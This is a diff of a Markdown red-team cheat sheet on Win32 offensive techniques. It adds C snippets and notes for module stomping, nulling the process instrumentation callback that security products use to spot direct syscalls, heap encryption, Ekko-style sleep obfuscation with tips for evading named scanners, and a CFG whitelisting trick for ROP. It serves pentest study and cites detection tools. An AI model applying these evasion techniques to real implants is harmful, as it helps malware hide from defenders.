@@ -51,7 +51,9 @@ Win32 and Kernel abusing techniques for pentesters & red-teamers made by [@UVisi
   - [Hell's Gate](#hells-gate)
   - [Heaven's Gate](#heavens-gate)
   - [PPID spoofing](#ppid-spoofing)
-  - [Heap & Stack Encryption ⏳]()
+  - [Process Instrumentation Callback](#process-instrumentation-callback)
+  - [Heap Encryption](#heap-encryption)
+  - [Sleep Obfuscation](#sleep-obfuscation)
 - [Driver Programming basics](#driver-programming-basics)
   - [General concepts](#general-concepts)
   - [System Service Dispatch Table (SSDT)](#system-service-dispatch-table-ssdt)
@@ -68,9 +70,9 @@ Win32 and Kernel abusing techniques for pentesters & red-teamers made by [@UVisi
     - [Scheduled Tasks ⏳]()
   - [Command line spoofing](#command-line-spoofing)
 - [Misc Stuff](#misc-stuff)
-  - [HTTP/S communication ⏳]()
-  - [Indirect Execution ⏳]()
-    - [CFG Bypass with SetProcessValidCallTargets ⏳]()
+  - [x64 Calling Convention](#x64-calling-convention)
+  - [Indirect Execution]()
+    - [CFG Bypass with SetProcessValidCallTargets]()
 
 <br>
 
@@ -321,7 +323,21 @@ Fibers can be defined as ```cooperatively scheduled threads (https://nullprogram
 
 ## MapView code injection ⏳
 
-## Module Stomping ⏳
+## Module Stomping
+
+This technique cause your beacon to be backed by a module on disk
+
+```c
+CHAR moduleName[]  = "windows.storage.dll\x00";
+HMODULE hVictimLib = LoadLibraryA(moduleName);
+
+DWORD_PTR RXSection = (DWORD_PTR)hVictimLib;
+RXSection 	   += 0x1000 * 0x2;
+RXSection  	   += 0xc;
+char* ptr 	    = ( char* )RXSection;
+```
+
+> to detect module stomping (especially for Cobalt Strike) a scanner was released named [DetectCobaltStomp](https://github.com/slaeryan/DetectCobaltStomp) to highlight some IoCs of the technique, but the [author](https://twitter.com/NinjaParanoid) of [Brute Ratel](https://bruteratel.com/) managed to [improve](https://www.youtube.com/watch?v=nPmcFKSHyvg&ab_channel=ChetanNayak) the original technique.
 
 ## Function Stomping
 
@@ -644,9 +660,47 @@ int main()
 }
 ```
 
-## Patch Kernel callbacks ⏳
+## Process Instrumentation Callback
 
-## Heap & Stack Encryption ⏳
+Process Instrumentation Callback is defined as the `ProcessInstrumentationCallback` flag (`0x40`) and is used by security products to [detect potential direct syscall](https://winternl.com/detecting-manual-syscalls-from-user-mode/) invocation by registering a callback to check if the `syscall` instruction comes from the executable image and not NTDLL. To bypass it for our process we just have to set `Callback` to `NULL`
+
+```c
+PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION InstrumentationCallbackInfo;
+
+InstrumentationCallbackInfo.Version  = 0x0;
+InstrumentationCallbackInfo.Reserved = 0x0;
+InstrumentationCallbackInfo.Callback = NULL;
+
+NtSetInformationProcess( hProcess, ProcessInstrumentationCallback, &InstrumentationCallbackInfo, sizeof( InstrumentationCallbackInfo ) );
+```
+> it's still "undocumented" by microsoft but [Alex Ionescu](https://twitter.com/aionescu) has documented it [here](https://www.youtube.com/watch?v=pHyWyH804xE&ab_channel=S%C3%A9bastienDuquette) and Everdox has also done so [here](https://www.codeproject.com/Articles/543542/Windows-x64-system-service-hooks-and-advanced-debu)
+
+> Full code to bypass instrumentation here : 
+
+## Heap Encryption
+
+Walk the heap with `HeapWalk` and then encrypt the allocations :
+```c
+VOID HeapEncryptDecrypt() {
+    PROCESS_HEAP_ENTRY HeapWalkEntry;
+    SecureZeroMemory( &HeapWalkEntry, sizeof( HeapWalkEntry ) );
+    while ( HeapWalk( GetProcessHeap(), &HeapWalkEntry ) ) {
+        if ( ( HeapWalkEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) != 0 ) {
+            XORFunction( key, keySize, ( char* )( HeapWalkEntry.lpData ), HeapWalkEntry.cbData );
+        }
+    }
+}
+```
+> more informations here: https://www.arashparsa.com/hook-heaps-and-live-free/
+
+## Sleep Obfuscation
+
+Many PoCs around sleep obfuscation came out with different mechanisms (UM APCs, TP and more) here we take as example [Ekko](https://github.com/Cracked5pider/Ekko/) which is the most easiest PoC to understand.
+
+the ROP chain of Ekko is very simple, it changes memory prot. to `RW`, encrypt the region with `SystemFunction032` which implement RC4, Sleep with `WaitForSingleObject`, Decrypt the region and switch again the prot. to `RWX`. Finally, it queues all `CONTEXT` with `CreateTimerQueueTimer`
+
+
+> Some scanners like [TickTock](https://github.com/WithSecureLabs/TickTock) or [Patriot](https://github.com/joe-desimone/patriot) has been released to detect that but you can avoid them by using a trampoline to `NtContinue` in NTDLL with gadget and replacing `Rip` register in ROP chain
  
 <br>
  
@@ -888,11 +942,38 @@ Poc : https://github.com/NVISOsecurity/blogposts/blob/master/examples-commandlin
  
 # Misc Stuff
 
-## HTTP/S communication
+## x64 Calling Convention
+
+- First 4 integer arguments are passed in registers `RCX`, `RDX`, `R8`, and `R9`.
+- Additional arguments are pushed onto the stack.
+- The return address is followed by a 32-byte area reserved for `RCX`, `RDX`, `R8`, and `R9`.
+- Local variables and non-volatile registers are stored above the return address.
+- `RBP` is not used to reference local variables/function arguments, and `RSP` remains constant throughout the function.
+
+> Notes:
+> - If a function has a variable number of arguments, it must use the stack to pass them
+> - If the return value is a structure, then the caller is responsible for allocating space for the return value and passing a pointer to that space as the first argument
+> - The callee is responsible for preserving the values of the `RBX`, `RBP`, and `R12`–`R15` registers, but may freely modify the other registers
+> - The stack is aligned to a 16-byte boundary at the call site
+> - The callee is responsible for restoring the stack pointer (`RSP`) to its original value before returning
 
 ## Indirect Execution
 
+Indirect Execution here refers to a ROP to achieve the execution of some tasks, you will need to add parameters to the right register, you must understand [x64 calling convention](https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet#x64-calling-convention) for that.
+
+- ROP with `CONTEXT` structure will need `RtlCaptureContext` to retrieve the current context and `NtContinue` to continue the execution of the ROP with `CONTEXT` struct as parameter filled with the right function arguments to the right registers. You can also build your ROP in assembly if you want.
+
 ### CFG Bypass with SetProcessValidCallTargets
+
+This is not a real bypass but it'll whitelist the function you're using in your ROP (i.e. `NtContinue`)
+```c
+CFG_CALL_TARGET_INFO Cfg = { 0 };
+
+Cfg.Offset = ( ULONG_PTR )pAddress - ( ULONG_PTR )Mbi.BaseAddress;
+Cfg.Flags  = CFG_CALL_TARGET_VALID;
+
+SetProcessValidCallTargets( ( HANDLE )-1,  Mbi.BaseAddress, Mbi.RegionSize, 1, &Cfg );
+```
 
 
 
